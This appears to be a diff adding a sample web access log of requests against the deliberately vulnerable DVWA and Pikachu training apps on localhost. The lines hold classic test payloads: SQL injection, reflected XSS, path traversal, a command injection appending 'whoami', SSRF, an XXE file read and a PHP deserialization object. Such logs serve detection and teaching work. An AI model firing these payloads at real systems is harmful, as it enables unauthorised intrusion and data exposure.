@@ -1,0 +1,8 @@
+127.0.0.1 - - [25/Jun/2026:10:00:01 +0800] "GET /dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
+127.0.0.1 - - [25/Jun/2026:10:01:02 +0800] "GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E HTTP/1.1" 200 900 "-" "Mozilla/5.0"
+127.0.0.1 - - [25/Jun/2026:10:02:03 +0800] "GET /dvwa/vulnerabilities/fi/?page=../../hackable/uploads/read-test.txt HTTP/1.1" 200 800 "-" "Mozilla/5.0"
+127.0.0.1 - - [25/Jun/2026:10:03:04 +0800] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 1000 "-" "Mozilla/5.0" "ip=127.0.0.1+%26+whoami&Submit=Submit"
+127.0.0.1 - - [25/Jun/2026:10:04:05 +0800] "GET /pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/ HTTP/1.1" 200 1500 "-" "Mozilla/5.0"
+127.0.0.1 - - [25/Jun/2026:10:05:06 +0800] "POST /pikachu/vul/xxe/xxe_1.php HTTP/1.1" 200 700 "-" "Mozilla/5.0" "xml=<?xml version='1.0'?><!DOCTYPE note [<!ENTITY xxe SYSTEM 'file:///C:/data/phpstudy_pro/WWW/pikachu/xxe-test.txt'>]><name>&xxe;</name>"
+127.0.0.1 - - [25/Jun/2026:10:06:07 +0800] "POST /pikachu/vul/unserilization/unser.php HTTP/1.1" 200 700 "-" "Mozilla/5.0" "o=O:1:\"S\":1:{s:4:\"test\";s:29:\"<script>alert('xss')</script>\";}"
+127.0.0.1 - - [25/Jun/2026:10:07:08 +0800] "GET /index.php HTTP/1.1" 200 500 "-" "Mozilla/5.0"
